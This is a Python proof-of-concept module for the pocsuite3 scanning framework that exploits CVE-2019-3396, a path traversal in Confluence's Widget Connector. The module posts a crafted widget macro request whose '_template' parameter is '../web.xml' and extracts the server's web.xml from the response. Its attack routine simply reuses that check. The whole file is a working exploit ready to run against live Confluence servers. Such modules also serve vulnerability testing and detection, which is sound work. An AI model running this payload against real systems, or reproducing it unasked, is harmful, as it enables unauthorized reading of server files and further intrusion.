import re

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE


class DemoPOC(POCBase):
    vulID = '97898'  # ssvid
    version = '1.0'
    references = ['']
    name = 'Confluence Widget Connector path traversal (CVE-2019-3396)'
    appPowerLink = ''
    appName = 'Confluence'
    appVersion = ''
    desc = ''''''
    samples = []
    install_requires = ['']
    vulType = VUL_TYPE.CODE_EXECUTION
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        filename = "../web.xml"
        limitSize = 1000

        target = self.url + "/rest/tinymce/1/macro/preview"
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
            "Referer": self.url + "/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",
            "Content-Type": "application/json; charset=utf-8"
        }
        data = '{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"%s"}}}' % filename
        r = requests.post(url=target, data=data, headers=headers,verify=False)

        if r.status_code == 200 and "</web-app>" in r.text:
            m = re.search('<web-app[\s\S]+<\/web-app>', r.text)
            if m:
                content = m.group()[:limitSize]
                result['FileInfo'] = {}
                result['FileInfo']['Filename'] = filename
                result['FileInfo']['Content'] = content

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
